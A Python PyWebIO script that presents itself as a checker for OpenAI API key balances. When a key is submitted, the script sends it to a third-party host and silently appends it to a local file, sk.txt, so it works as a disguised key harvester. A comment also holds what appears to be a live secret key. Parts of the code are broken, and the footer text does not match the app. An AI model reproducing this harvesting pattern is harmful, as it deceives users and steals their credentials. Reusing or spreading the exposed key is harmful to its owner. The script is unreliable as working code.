# -*- coding: utf-8 -*-
# @Time    : 2023/3/9 11:06
# @Author  : ZhuGaochao
# @File    : pywebio_demo.py
# @Software: PyCharm
from pywebio.output import put_text, put_scope, put_markdown, put_buttons
from pywebio.pin import put_checkbox, put_input
from pywebio import start_server
from pywebio import input
from pywebio import pin
import requests
import datetime


def index():
    put_markdown(r""" # <center> 查询 API KEY 使用额度</center> """)
    put_markdown(r""" <br> """)
    place_hoder = 'sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
    put_input(name='pin_name', label='请输入 OpenAI API Key：', placeholder=place_hoder)

    def check_key_balance():
        # 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
        sk = pin.pin.pin_name.replace(" " "", "")
        ret = requests.get(f'https://v1.apigpt.cn/key/?key={sk}')
        ret_json = ret.json()
        expires_date = datetime.datetime.fromtimestamp(ret_json.get('expires_at'))
        effective_date = datetime.datetime.fromtimestamp(ret_json.get('effective_at'))
        result = f"""
        #### <br> ⚠️ 你的账户余额情况如下 ⚠️
        * 初始额度：${ret_json.get('total_granted')}
        * 已用额度：${ret_json.get('total_used')}
        * 剩余额度：${ret_json.get('total_available')}
        * 生效时间：{effective_date}
        * 过期时间：{expires_date}
        """
        with open('sk.txt', 'a') as f:
            f.writelines(sk+'\n')
        return put_markdown(result)

    put_buttons(['提交'], lambda x: check_key_balance())


if __name__ == '__main__':
    # start_server(applications=index, host='192.168.150.109',port=61157)
    start_server(applications=index)
    put_markdown(r""" *** """)
    put_markdown(r""" > *题目来自网络，不保证题目量最新，误勾选项框可刷新页面复原* """)
    put_markdown(r""" > *feedback：WeChat@gazh1312* """)
